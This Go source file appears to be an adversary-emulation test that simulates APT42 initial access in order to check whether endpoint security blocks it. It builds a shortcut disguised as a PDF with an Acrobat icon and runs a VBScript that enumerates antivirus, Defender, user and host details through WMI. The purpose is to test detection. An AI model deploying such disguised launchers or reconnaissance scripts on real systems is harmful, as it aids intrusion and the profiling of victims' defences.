//go:build windows

/*
STAGE 1: User Execution - Malicious File (T1204.002)
Simulates APT42 initial access via malicious LNK file with VBScript downloader.
Creates realistic .lnk file structure and VBScript that enumerates Windows Defender via WMI.
*/

package main

import (
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

const (
	TEST_UUID      = "92b0b4f6-a09b-4c7b-b593-31ce461f804c"
	TECHNIQUE_ID   = "T1204.002"
	TECHNIQUE_NAME = "User Execution: Malicious File"
	STAGE_ID       = 1
)

const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

func main() {
	AttachLogger(TEST_UUID, fmt.Sprintf("Stage %d: %s", STAGE_ID, TECHNIQUE_ID))

	LogMessage("INFO", TECHNIQUE_ID, "Starting Initial Access via LNK + VBScript simulation")
	LogStageStart(STAGE_ID, TECHNIQUE_ID, "Malicious LNK file delivery with VBScript downloader")

	if err := performTechnique(); err != nil {
		errStr := err.Error()
		if strings.Contains(strings.ToLower(errStr), "access denied") ||
			strings.Contains(strings.ToLower(errStr), "blocked") ||
			strings.Contains(strings.ToLower(errStr), "prevented") ||
			strings.Contains(strings.ToLower(errStr), "quarantine") {
			fmt.Printf("[STAGE %s] Technique blocked: %v\n", TECHNIQUE_ID, err)
			LogMessage("BLOCKED", TECHNIQUE_ID, fmt.Sprintf("Technique blocked: %v", err))
			LogStageBlocked(STAGE_ID, TECHNIQUE_ID, err.Error())
			os.Exit(StageBlocked)
		}

		fmt.Printf("[STAGE %s] Technique failed: %v\n", TECHNIQUE_ID, err)
		LogMessage("ERROR", TECHNIQUE_ID, fmt.Sprintf("Technique failed: %v", err))
		LogStageEnd(STAGE_ID, TECHNIQUE_ID, "error", err.Error())
		os.Exit(StageError)
	}

	LogMessage("SUCCESS", TECHNIQUE_ID, "Initial access simulation completed - LNK + VBScript delivered")
	LogStageEnd(STAGE_ID, TECHNIQUE_ID, "success", "Malicious LNK and VBScript deployed, WMI AV enumeration executed")
	os.Exit(StageSuccess)
}

func performTechnique() error {
	targetDir := "c:\\F0"

	// Step 1: Create realistic malicious LNK file
	fmt.Printf("[STAGE %s] Creating malicious .lnk file structure...\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Creating malicious LNK file simulating WebDAV delivery")

	lnkPath := filepath.Join(targetDir, "Important_Document.pdf.lnk")
	lnkData := createMaliciousLNK()
	if err := os.WriteFile(lnkPath, lnkData, 0644); err != nil {
		return fmt.Errorf("failed to create LNK file: %v", err)
	}
	fmt.Printf("[STAGE %s] LNK file created: %s (%d bytes)\n", TECHNIQUE_ID, lnkPath, len(lnkData))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("LNK file created: %s (%d bytes)", lnkPath, len(lnkData)))

	time.Sleep(2 * time.Second) // Allow EDR reaction

	// Check if LNK was quarantined
	if _, err := os.Stat(lnkPath); os.IsNotExist(err) {
		return fmt.Errorf("LNK file quarantined by security controls")
	}

	// Step 2: Create VBScript downloader (TAMECAT-style)
	fmt.Printf("[STAGE %s] Creating VBScript downloader with WMI AV enumeration...\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Creating TAMECAT-style VBScript with WMI AV enumeration")

	vbsContent := createTAMECATVBScript()
	vbsPath := filepath.Join(targetDir, "update_check.vbs")
	if err := os.WriteFile(vbsPath, []byte(vbsContent), 0644); err != nil {
		return fmt.Errorf("failed to create VBScript: %v", err)
	}
	fmt.Printf("[STAGE %s] VBScript created: %s (%d bytes)\n", TECHNIQUE_ID, vbsPath, len(vbsContent))
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("VBScript created: %s (%d bytes)", vbsPath, len(vbsContent)))

	time.Sleep(2 * time.Second) // Allow EDR reaction

	// Check if VBS was quarantined
	if _, err := os.Stat(vbsPath); os.IsNotExist(err) {
		return fmt.Errorf("VBScript quarantined by security controls")
	}

	// Step 3: Execute VBScript to perform WMI AV enumeration (T1059.005)
	fmt.Printf("[STAGE %s] Executing VBScript for WMI AV enumeration...\n", TECHNIQUE_ID)
	LogMessage("INFO", TECHNIQUE_ID, "Executing VBScript - WMI AV enumeration via cscript.exe")

	cmd := exec.Command("cscript.exe", "//Nologo", "//T:15", vbsPath)
	cmd.Dir = targetDir
	output, err := cmd.CombinedOutput()
	if err != nil {
		outStr := string(output)
		fmt.Printf("[STAGE %s] VBScript execution result: %v\nOutput: %s\n", TECHNIQUE_ID, err, outStr)
		if strings.Contains(strings.ToLower(outStr), "blocked") ||
			strings.Contains(strings.ToLower(outStr), "disabled") ||
			strings.Contains(strings.ToLower(err.Error()), "access denied") {
			return fmt.Errorf("VBScript execution blocked by EDR: %v", err)
		}
		// Non-blocking errors (e.g., timeout from //T:15) are acceptable
		LogMessage("WARN", TECHNIQUE_ID, fmt.Sprintf("VBScript execution returned non-zero: %v (may be acceptable)", err))
	} else {
		fmt.Printf("[STAGE %s] VBScript output:\n%s\n", TECHNIQUE_ID, string(output))
		LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("VBScript output: %s", string(output)))
	}

	// Save VBScript output
	outputPath := filepath.Join(targetDir, "vbs_av_enum_output.txt")
	os.WriteFile(outputPath, output, 0644)
	LogMessage("INFO", TECHNIQUE_ID, fmt.Sprintf("VBScript output saved to: %s", outputPath))

	fmt.Printf("[STAGE %s] Initial access simulation complete\n", TECHNIQUE_ID)
	return nil
}

// createMaliciousLNK creates a realistic Windows .lnk shortcut file structure
// that would invoke cscript.exe to run the VBScript downloader
func createMaliciousLNK() []byte {
	// Windows Shell Link Binary Format (.lnk)
	// Reference: MS-SHLLINK specification
	buf := make([]byte, 0, 512)

	// Shell Link Header (76 bytes)
	// HeaderSize = 0x4C (76)
	header := make([]byte, 76)
	binary.LittleEndian.PutUint32(header[0:4], 0x4C)
	// LinkCLSID {00021401-0000-0000-C000-000000000046}
	copy(header[4:20], []byte{0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46})
	// LinkFlags: HasLinkTargetIDList | HasRelativePath | HasArguments | HasIconLocation
	binary.LittleEndian.PutUint32(header[20:24], 0x000000FB)
	// FileAttributes: FILE_ATTRIBUTE_NORMAL
	binary.LittleEndian.PutUint32(header[24:28], 0x00000020)

	buf = append(buf, header...)

	// LinkTargetIDList (simplified - points to cscript.exe conceptually)
	idListSize := uint16(20)
	idListBuf := make([]byte, 2)
	binary.LittleEndian.PutUint16(idListBuf, idListSize)
	buf = append(buf, idListBuf...)

	// Minimal IDList with terminator
	idList := make([]byte, idListSize)
	// ItemID: simple item pointing to System32
	binary.LittleEndian.PutUint16(idList[0:2], 16) // ItemIDSize
	copy(idList[2:16], []byte("cscript.exe\x00\x00\x00"))
	// Terminal ItemID (0x0000)
	binary.LittleEndian.PutUint16(idList[16:18], 0)
	buf = append(buf, idList...)

	// StringData - Relative Path (points to cscript.exe)
	relPath := "C:\\Windows\\System32\\cscript.exe"
	relPathUTF16 := stringToUTF16(relPath)
	relPathLen := make([]byte, 2)
	binary.LittleEndian.PutUint16(relPathLen, uint16(len(relPathUTF16)/2))
	buf = append(buf, relPathLen...)
	buf = append(buf, relPathUTF16...)

	// Arguments (would run the VBScript)
	args := "//Nologo //B c:\\F0\\update_check.vbs"
	argsUTF16 := stringToUTF16(args)
	argsLen := make([]byte, 2)
	binary.LittleEndian.PutUint16(argsLen, uint16(len(argsUTF16)/2))
	buf = append(buf, argsLen...)
	buf = append(buf, argsUTF16...)

	// Icon Location (disguised as PDF icon)
	iconLoc := "C:\\Program Files\\Adobe\\Acrobat\\Acrobat.exe"
	iconUTF16 := stringToUTF16(iconLoc)
	iconLen := make([]byte, 2)
	binary.LittleEndian.PutUint16(iconLen, uint16(len(iconUTF16)/2))
	buf = append(buf, iconLen...)
	buf = append(buf, iconUTF16...)

	return buf
}

// stringToUTF16 converts a Go string to UTF-16LE bytes
func stringToUTF16(s string) []byte {
	result := make([]byte, len(s)*2)
	for i, c := range s {
		binary.LittleEndian.PutUint16(result[i*2:], uint16(c))
	}
	return result
}

// createTAMECATVBScript creates a VBScript that performs WMI AV enumeration
// matching TAMECAT/APT42 TTPs - checks for Defender status via WMI
func createTAMECATVBScript() string {
	return `' TAMECAT-style VBScript Downloader Simulation
' APT42 Initial Access - WMI AV Enumeration
' This script enumerates security products via WMI (T1059.005)
' SIMULATION ONLY - does not download actual payloads

On Error Resume Next

Dim objWMI, colItems, objItem
Dim strComputer, strOutput
Dim fso, outFile

strComputer = "."
strOutput = ""

' Phase 1: Enumerate installed antivirus products via WMI SecurityCenter2
Set objWMI = GetObject("winmgmts:\\" & strComputer & "\root\SecurityCenter2")
If Err.Number = 0 Then
    Set colItems = objWMI.ExecQuery("SELECT * FROM AntiVirusProduct")
    If Err.Number = 0 Then
        For Each objItem in colItems
            strOutput = strOutput & "AV_PRODUCT=" & objItem.displayName & vbCrLf
            strOutput = strOutput & "AV_STATE=" & objItem.productState & vbCrLf
        Next
    End If
End If
Err.Clear

' Phase 2: Check Windows Defender specific WMI namespace
Set objWMI = GetObject("winmgmts:\\" & strComputer & "\root\Microsoft\Windows\Defender")
If Err.Number = 0 Then
    Set colItems = objWMI.ExecQuery("SELECT * FROM MSFT_MpComputerStatus")
    If Err.Number = 0 Then
        For Each objItem in colItems
            strOutput = strOutput & "DEFENDER_ENABLED=" & objItem.AntivirusEnabled & vbCrLf
            strOutput = strOutput & "DEFENDER_REALTIME=" & objItem.RealTimeProtectionEnabled & vbCrLf
            strOutput = strOutput & "DEFENDER_VERSION=" & objItem.AntivirusSignatureVersion & vbCrLf
        Next
    End If
End If
Err.Clear

' Phase 3: Gather system information for C2 callback (simulated)
Set objWMI = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
If Err.Number = 0 Then
    Set colItems = objWMI.ExecQuery("SELECT * FROM Win32_ComputerSystem")
    For Each objItem in colItems
        strOutput = strOutput & "HOSTNAME=" & objItem.Name & vbCrLf
        strOutput = strOutput & "DOMAIN=" & objItem.Domain & vbCrLf
        strOutput = strOutput & "USERNAME=" & objItem.UserName & vbCrLf
    Next

    Set colItems = objWMI.ExecQuery("SELECT * FROM Win32_OperatingSystem")
    For Each objItem in colItems
        strOutput = strOutput & "OS_VERSION=" & objItem.Version & vbCrLf
        strOutput = strOutput & "OS_CAPTION=" & objItem.Caption & vbCrLf
    Next
End If

' Write enumeration results to file (simulating data staging)
Set fso = CreateObject("Scripting.FileSystemObject")
Set outFile = fso.CreateTextFile("c:\F0\av_enum_results.txt", True)
outFile.Write strOutput
outFile.Close

WScript.Echo "[TAMECAT] AV enumeration complete"
WScript.Echo strOutput
`
}
